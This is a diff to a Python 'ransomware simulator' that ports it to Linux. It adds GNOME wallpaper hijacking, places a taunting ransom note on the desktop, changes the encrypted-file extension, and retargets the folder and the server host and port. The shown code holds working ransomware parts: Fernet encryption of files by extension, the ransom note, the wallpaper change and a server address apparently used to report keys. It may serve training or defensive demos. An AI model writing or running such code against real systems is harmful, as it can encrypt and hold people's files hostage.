@@ -16,11 +16,21 @@ class RansomwareSimulator:
         self.key = Fernet.generate_key()
 
     def change_wallpaper(self, image_path):
-        if os.name == 'nt':
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path , 0)
-
-        else:
-            print("Wallpaper change feature is not supported on this OS.")
+        if os.name == 'nt':  # Windows
+            import ctypes
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
+        else:  # Linux
+            desktop_env = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()
+            try:
+                if 'gnome' in desktop_env:  # GNOME desktop
+                    subprocess.run([
+                        'gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f"file://{image_path}"
+                    ], check=True)
+                else:
+                    print("Wallpaper change feature is not supported on this OS.")
+            except Exception as e:
+                print(f"Failed to change wallpaper: {e}")
+            
 
     def get_mac_address(self):
         mac_num = hex(uuid.getnode()).replace('0x', '').upper()
@@ -30,10 +40,11 @@ class RansomwareSimulator:
 
 
     def create_readme(self):
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        desktop_path = os.path.join(os.environ['HOME'], 'Desktop') #Linux
+        #desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') #Windows
         readme_path = os.path.join(desktop_path, 'Readme.txt')
         with open(readme_path, 'w') as file:
-            file.write("This is a simulation program, your files are encrypted.")
+            file.write("Ur files are encrypted :( Should have used Ransomware Defender (Simulation)")
 
 
     def encrypt_file(self, file_path):
@@ -42,7 +53,7 @@ class RansomwareSimulator:
             original = file.read()
         encrypted = fernet.encrypt(original)
 
-        encrypted_file_path = file_path + ".denizhalil"
+        encrypted_file_path = file_path + ".hakd"
         with open(encrypted_file_path, 'wb') as encrypted_file:
             encrypted_file.write(encrypted)
 
@@ -94,10 +105,14 @@ class RansomwareSimulator:
 
 def main():
     file_extensions = ['.txt', '.docx', '.jpg']
-    directory = 'dosyalar/'  # 'dosyalar/' should be replaced with the directory path you want to target
-    wallpaper_path = r"duvarkağıtı/araba.jpg"
-    server_host = '10.0.2.37'
+    directory = 'rw_target/'  #should be replaced with the directory path you want to target
+    wallpaper_path = r"img/hacked.jpg" #May require full path
+    server_host = '127.0.0.1'
+    #server_host = '10.0.2.37' #Original
     server_port = 12345
+
+
+
 
     simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
     simulator.find_and_encrypt_files()
